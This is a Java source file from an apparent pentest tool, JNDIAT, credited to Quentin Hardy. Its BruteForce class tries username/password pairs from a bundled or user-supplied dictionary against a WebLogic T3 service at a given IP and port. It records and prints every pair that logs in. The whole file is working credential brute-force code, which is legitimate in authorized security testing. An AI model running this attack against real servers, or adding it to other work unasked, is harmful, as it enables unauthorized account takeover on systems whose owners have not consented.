//JNDIAT by Quentin HARDY
//quentin.hardy@protonmail.com

import javax.naming.*;
import java.util.logging.Logger;
import java.util.Arrays;
import java.util.ArrayList;
import java.util.List;
import java.io.BufferedReader;
import java.io.FileReader;
import java.net.URL;
import java.io.InputStream;
import java.io.InputStreamReader;

public class BruteForce extends T3Connection{

	private static Logger myLogger = Logger.getLogger("JNDIAT");	
	private List<String[]> accountsFound;
	private String credFilename;
	private String ip;
	private Integer port;
	private String separator;
			
	//*************   Constructor *************
	public BruteForce(String ip, Integer port, String initial_context_factory, boolean printErrorConnection, String credFilename, String separator){
		super(initial_context_factory, false);
		myLogger.fine("Brutforce object created");
		this.ip = ip;
		this.port = port;
		this.accountsFound = new ArrayList<String[]>();
		this.credFilename = credFilename;
		this.separator = separator;
	}
	
	/*Search valid credentials
	 * Return True if no error
	 * Otherwise return true */
	public boolean searchValidCreds(){
		String line = "";
		String[] creds = {};
		boolean connectionStatus = false;
		BufferedReader reader = null;
		try {
			if (this.credFilename==""){
				myLogger.finer("We use the credentials.txt file stored in the Jar file");
				URL urlToDictionary = this.getClass().getResource("/" + "credentials.txt");
				reader = new BufferedReader(new InputStreamReader(urlToDictionary.openStream(), "UTF-8"));
				credFilename = "jar://credentials.txt";
			}
			else {
				myLogger.finer("We use your own file stored");
				reader = new BufferedReader(new FileReader(this.credFilename));
			}
		}
		catch (Exception e){
			myLogger.severe("Exception occurred trying to read '"+this.credFilename+"': '"+e+"'");
			return false;
		}
		myLogger.fine("Searching valid credentials thanks to "+this.credFilename+" file...");			
		try {
			while ((line = reader.readLine()) != null){
				creds = line.replaceAll("\n","").replaceAll("\t","").replaceAll("\r","").split(this.separator);
				if (creds.length == 0) {creds = new String[]{"",""};};
				myLogger.finer("Using the username '"+creds[0]+"' and the password '"+creds[1]+"'");
				connectionStatus = connection (this.ip, this.port, creds[0], creds[1]);
				if (connectionStatus == true){
					myLogger.fine("We can use the login '"+creds[0]+"' with the password '"+creds[1]+"' to establish a T3 connection");
					this.accountsFound.add(creds);
				}
				else {
					myLogger.finer("We can't use the login '"+creds[0]+"' with the password '"+creds[1]+"' to establish a T3 connection");
				}
			}
			reader.close();
		}
		catch (Exception e){
			myLogger.warning("Exception occurred trying to use credentials stored the line '"+line+"' ('"+this.credFilename+"' file): '"+e+"'");
		}
		return true;	
	}
	
	public List<String[]> getValidAccounts (){
		return this.accountsFound;
	}
	
	public void printValidCreds(){
		String line="";
		int pos = 0;
		if (this.accountsFound.toArray().length == 0){
			this.printBadNews ("No credentials found to connect");
		}
		else {
			for (pos = 0;pos<this.accountsFound.toArray().length; pos = pos+1){
				line = line + ", login='"+this.accountsFound.get(pos)[0]+ "'/password='"+this.accountsFound.get(pos)[1]+"'";
			}
			this.printGoodNews ("Some credentials found: "+line);
		}
	}
}
